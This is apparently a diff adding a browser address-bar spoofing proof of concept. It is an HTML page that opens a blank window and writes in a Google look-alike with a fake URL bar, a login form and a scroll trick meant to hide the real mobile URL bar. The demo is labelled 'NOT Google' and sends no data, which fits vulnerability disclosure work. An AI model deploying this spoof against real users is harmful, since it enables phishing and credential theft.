@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Address Bar Spoof PoC (Demo)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+<body style="font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 2rem;">
+  <button onclick="spoof()" style="font-size: 18px; padding: 10px 16px; cursor: pointer;">
+    Click to spoof
+  </button>
+
+  <script>
+    function spoof() {
+      // Try to open a new about:blank tab/window from a user gesture.
+      const win = window.open('about:blank', '_blank', 'noopener,noreferrer');
+
+      if (!win) {
+        alert('Popup blocked by the browser. Allow popups for this site to run the PoC.');
+        return;
+      }
+
+      const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Google</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <base target="_self">
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; padding: 0; min-height: 100%; }
+    body { font-family: Arial, Helvetica, sans-serif; color: #202124; background: #ffffff; }
+
+    /* Fake address bar */
+    #fake-bar {
+      position: sticky; /* stays at top during scroll */
+      top: 0; left: 0; right: 0;
+      height: 56px;
+      background: #ffffff;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+      z-index: 9999;
+      display: flex; align-items: center; gap: 12px;
+      padding: 0 12px;
+    }
+    #omnibox {
+      flex: 1;
+      background: #f1f3f4;
+      border-radius: 24px;
+      padding: 8px 16px;
+      font-size: 14px;
+      color: #202124;
+      text-align: center;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      border: 1px solid rgba(0,0,0,0.06);
+    }
+    #lock {
+      width: 14px; height: 14px; border-radius: 2px;
+      background: #0f9d58; display: inline-block;
+      margin-right: 6px;
+    }
+
+    /* Page content */
+    .content {
+      padding: 24px 16px;
+      min-height: 2000px; /* tall content to encourage scroll */
+      text-align: center;
+    }
+    .logo {
+      width: 160px; height: auto; margin-top: 20px;
+    }
+    .card {
+      width: 100%;
+      max-width: 320px;
+      margin: 24px auto 0;
+      padding: 24px;
+      border: 1px solid rgba(0,0,0,0.08);
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+      background: #fff;
+      text-align: left;
+    }
+    .input {
+      width: 100%;
+      padding: 10px 12px;
+      margin: 8px 0 12px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+    }
+    .btn {
+      width: 100%;
+      padding: 10px 14px;
+      border: none;
+      border-radius: 8px;
+      background: #4285F4;
+      color: #fff;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .spacer { margin-top: 500px; }
+  </style>
+</head>
+<body>
+  <div id="fake-bar" role="banner" aria-label="Fake browser UI">
+    <div id="omnibox" aria-hidden="true">
+      <span id="lock"></span> https://www.google.com
+    </div>
+  </div>
+
+  <div class="content" role="main">
+    <img class="logo" alt="Google Logo"
+         src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png">
+    <h1 style="margin: 12px 0 8px;">This is <u>NOT</u> Google!</h1>
+    <p style="margin: 0 0 8px;">Demo page for address bar spoofing PoC.</p>
+
+    <form class="card" onsubmit="event.preventDefault(); alert('Demo only. No data is sent.');">
+      <label>Username</label>
+      <input class="input" type="text" autocomplete="off" placeholder="Username" />
+      <label>Password</label>
+      <input class="input" type="password" autocomplete="off" placeholder="Password" />
+      <button class="btn" type="submit">Sign In</button>
+    </form>
+
+    <div class="spacer">
+      <p>Scroll down to see more content…</p>
+    </div>
+  </div>
+
+  <script>
+    // Nudge scroll slightly to encourage mobile UI to hide the real URL bar.
+    // Re-try a few times in case of race with rendering.
+    let tries = 0;
+    function nudgeScroll() {
+      try { window.scrollTo(0, 1); } catch(e) {}
+      if (++tries < 6) requestAnimationFrame(nudgeScroll);
+    }
+    window.addEventListener('load', function () {
+      // Focusing then nudging sometimes helps on mobile
+      try { document.body.focus(); } catch(e) {}
+      setTimeout(nudgeScroll, 300);
+    });
+  </script>
+</body>
+</html>`;
+
+      // Write the full document into the new window
+      const doc = win.document;
+      doc.open('text/html', 'replace');
+      doc.write(html);
+      doc.close();
+    }
+  </script>
+</body>
+</html>
